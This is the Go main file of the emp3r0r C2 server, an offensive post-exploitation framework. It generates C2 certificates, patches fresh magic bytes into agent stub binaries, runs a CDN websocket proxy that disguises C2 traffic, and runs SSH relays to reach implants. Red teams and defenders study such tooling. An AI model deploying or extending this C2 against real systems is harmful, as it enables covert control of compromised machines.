//go:build linux
// +build linux

package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/cc"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
)

var Logger = logging.NewLogger(2)

func readJSONConfig(filename string) (err error) {
	// read JSON
	jsonData, err := os.ReadFile(filename)
	if err != nil {
		return
	}

	return emp3r0r_def.ReadJSONConfig(jsonData, cc.RuntimeConfig)
}

// re-generate a random magic string for this CC session
func init_magic_agent_one_time_bytes() {
	default_magic_str := emp3r0r_def.OneTimeMagicBytes
	emp3r0r_def.OneTimeMagicBytes = util.RandBytes(len(default_magic_str))

	// update binaries
	files, err := os.ReadDir(cc.EmpWorkSpace)
	if err != nil {
		Logger.Fatal("init_magic_str: %v", err)
	}
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		if strings.HasPrefix(f.Name(), "stub-") {
			err = util.ReplaceBytesInFile(fmt.Sprintf("%s/%s", cc.EmpWorkSpace, f.Name()),
				default_magic_str, emp3r0r_def.OneTimeMagicBytes)
			if err != nil {
				Logger.Error("init_magic_str %v", err)
			}
		}
	}
}

// Options struct to hold flag values
type Options struct {
	cdnProxy         string
	config           string
	names            string
	apiServer        bool
	sshRelayPort     string
	connectRelayAddr string
	relayedPort      int
	debug            bool
}

func parseFlags() *Options {
	opts := &Options{}
	flag.StringVar(&opts.cdnProxy, "cdn2proxy", "", "Start cdn2proxy server on this port")
	flag.StringVar(&opts.config, "config", cc.EmpConfigFile, "Use this config file to update hardcoded variables")
	flag.StringVar(&opts.names, "gencert", "", "Generate C2 server cert with these host names")
	flag.BoolVar(&opts.apiServer, "api", false, "Run API server in background, you can send commands to /tmp/emp3r0r.socket")
	flag.StringVar(&opts.sshRelayPort, "relay_server", "", "Act as SSH remote forwarding relay on this port")
	flag.StringVar(&opts.connectRelayAddr, "connect_relay", "", "Connect to SSH remote forwarding relay (host:port)")
	flag.IntVar(&opts.relayedPort, "relayed_port", 0, "Relayed port, use with -connect_relay")
	flag.BoolVar(&opts.debug, "debug", false, "Do not kill tmux session when crashing, so you can see the crash log")
	flag.Parse()
	return opts
}

// New helper function to start the cdn2proxy server
func startCDN2Proxy(opts *Options) {
	go func() {
		logFile, openErr := os.OpenFile("/tmp/ws.log", os.O_CREATE|os.O_RDWR, 0o600)
		if openErr != nil {
			Logger.Fatal("OpenFile: %v", openErr)
		}
		openErr = cdn2proxy.StartServer(opts.cdnProxy, "127.0.0.1:"+cc.RuntimeConfig.CCPort, "ws", logFile)
		if openErr != nil {
			Logger.Fatal("CDN StartServer: %v", openErr)
		}
	}()
}

func main() {
	// set up dirs and default varaibles
	// including config file location
	err := cc.InitC2()
	if err != nil {
		log.Fatalf("C2 directory setup: %v", err)
	}

	// set up logger
	Logger = logging.NewLogger(2)

	// Parse command-line flags
	opts := parseFlags()

	// do not kill tmux session when crashing
	if opts.debug {
		cc.TmuxPersistence = true
	}

	// generate C2 TLS cert for given host names
	if opts.names != "" {
		hosts := strings.Fields(opts.names)
		certErr := cc.GenC2Certs(hosts)
		if certErr != nil {
			Logger.Fatal("GenC2Certs: %v", certErr)
		}
		certErr = cc.InitConfigFile(hosts[0])
		if certErr != nil {
			Logger.Fatal("Init %s: %v", cc.EmpConfigFile, certErr)
		}
		os.Exit(0)
	}

	// read config file
	err = readJSONConfig(opts.config)
	if err != nil {
		Logger.Fatal("Failed to read config from '%s': %v", opts.config, err)
	}

	// set up magic string
	init_magic_agent_one_time_bytes()

	// abort if CC is already running
	if cc.IsCCRunning() {
		Logger.Fatal("CC is already running")
	}

	// Run as SSH relay client if requested
	if opts.connectRelayAddr != "" {
		if opts.relayedPort == 0 {
			Logger.Fatal("Please specify -relayed_port")
		}
		runSSHRelayClient(opts)
	}

	// Start cdn2proxy server if specified
	if opts.cdnProxy != "" {
		startCDN2Proxy(opts)
	}

	// use emp3r0r in terminal or from other frontend
	if opts.apiServer {
		// TODO: implement API main
		Logger.Fatal("API server is not implemented yet")
	}

	// Run as SSH relay server if specified; otherwise run CLI
	if opts.sshRelayPort != "" {
		runSSHRelayServer(opts)
	} else {
		cc.CliMain()
	}
}

// handle SSH relay client logic
func runSSHRelayClient(opts *Options) {
	sshPassword := new(string)
	fmt.Printf("Enter SSH password: ")
	fmt.Scanln(sshPassword)
	go func(pass string) {
		defer Logger.Error("session unexpectedly exited, please restart emp3r0r")
		SSHConnections := make(map[string]context.CancelFunc, 10)
		pubkey, sshKeyErr := tun.SSHPublicKey(cc.RuntimeConfig.SSHHostKey)
		if sshKeyErr != nil {
			Logger.Fatal("Parsing SSHPublicKey: %v", sshKeyErr)
		}
	ssh_connect:
		ctx, cancel := context.WithCancel(context.Background())
		sshKeyErr = tun.SSHRemoteFwdClient(opts.connectRelayAddr,
			pass,
			pubkey, // enable host key verification
			opts.relayedPort,
			&SSHConnections, ctx, cancel)
		if sshKeyErr == nil {
			sshKeyErr = fmt.Errorf("session unexpectedly exited")
			Logger.Warning("SSHRemoteFwdClient: %v, retrying", sshKeyErr)
		}
		for ctx.Err() == nil {
			util.TakeABlink()
		}
		goto ssh_connect
	}(*sshPassword)
}

// handle SSH relay server logic
func runSSHRelayServer(opts *Options) {
	sshPassword := util.RandMD5String()
	log.Printf("SSH password is %s. Copy ~/.emp3r0r to client host, "+
		"then run `emp3r0r -connect_relay relay_ip:%s -relayed_port %s` "+
		"(C2 port, or KCP port %s if you are using it)",
		strconv.Quote(sshPassword), opts.sshRelayPort, cc.RuntimeConfig.CCPort, cc.RuntimeConfig.KCPServerPort)
	if err := tun.SSHRemoteFwdServer(opts.sshRelayPort,
		sshPassword,
		cc.RuntimeConfig.SSHHostKey); err != nil {
		log.Fatalf("SSHRemoteFwdServer: %v", err)
	}
}
